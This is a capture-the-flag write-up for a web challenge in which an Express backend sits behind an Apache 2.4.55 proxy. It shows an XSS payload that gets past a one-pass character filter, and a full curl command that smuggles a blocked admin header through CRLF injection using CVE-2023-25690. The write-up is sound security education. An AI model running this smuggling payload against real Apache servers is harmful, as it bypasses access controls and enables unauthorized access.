![](Pasted%20image%2020250517162525.png)

so we are provided with the source code.

![](Pasted%20image%2020250517162705.png)
hmm.

```dockerfile
COPY flag.txt /ctf/flag.txt
```

so the flag is in a text file, which means we have to find a vulnerability that could lead us to read the file (LFI, RCE etc).


server.js:
```js
// imports
const express = require('express');
const fs = require('fs');

// initializations
const app = express()
const FLAG = fs.readFileSync('flag.txt', { encoding: 'utf8', flag: 'r' }).trim()
const PORT = 3000

// endpoints
app.get('/', async (req, res) => {
    if (req.header('a') && req.header('a') === 'admin') {
        return res.send(FLAG);
    }
    return res.send('Hello '+req.query.name.replace("<","").replace(">","")+'!');
});

// start server
app.listen(PORT, async () => {
    console.log(`Listening on ${PORT}`)
});
```

so we have one main endpoint: `/` and it accepts a `name` parameter and sanitize it by replacing `<` and `>` by nothing. (it removes them). but it's actually vulnerable. why?

the `replace` function searches for the first character with `<` or `>` and change it to nothing. which means if we made a payload like: `<<script>>alert()</script>`. it would work just fine!

## Exploring

Once we open the site:
![](Pasted%20image%2020250517170551.png)

adding the `name` parameter with a value:
![](Pasted%20image%2020250517170623.png)

still nothing. hmm, OHHH! did you see the `httpd.conf` file's content?

httpd.conf:
```http
LoadModule rewrite_module modules/mod_rewrite.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so

<VirtualHost *:80>

    ServerName localhost
    DocumentRoot /usr/local/apache2/htdocs

    RewriteEngine on
    RewriteRule "^/name/(.*)" "http://backend:3000/?name=$1" [P]
    ProxyPassReverse "/name/" "http://backend:3000/"

    RequestHeader unset A
    RequestHeader unset a

</VirtualHost>
```

so, instead of `?name=xle0x` we should do `/name/xle0x` right?

![](Pasted%20image%2020250517170927.png)
awesome! let's make sure that our assumption about `replace` function was correct!
![](Pasted%20image%2020250517171937.png)
yes!

now it's time to bypass this:
```
RequestHeader unset A
RequestHeader unset a
```

when we add `a: admin` nothing happens, that's because the proxy unset this header.

so after sometime of searching for CVEs of the running Apache version `2.4.55`. I found this: https://github.com/dhmosfunk/CVE-2023-25690-POC

So, it's a HTTP request smuggling vulnerability with use of XSS and CRLF injection? yep.

after a lot of time I found this valid payload:

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: wonka.chal.cyberjousting.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36' \
    $'https://wonka.chal.cyberjousting.com/name/1%20HTTP/1.1%0d%0aa:%20admin%0d%0aHost:%20backend:3000%0d%0a%0d%0aGET%20/'
```

```
GET /name/1%20HTTP/1.1%0d%0aa:%20admin%0d%0aHost:%20backend:3000%0d%0a%0d%0aGET%20/ HTTP/2
Host: wonka.chal.cyberjousting.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
```

![](Pasted%20image%2020250517180734.png)

ezz!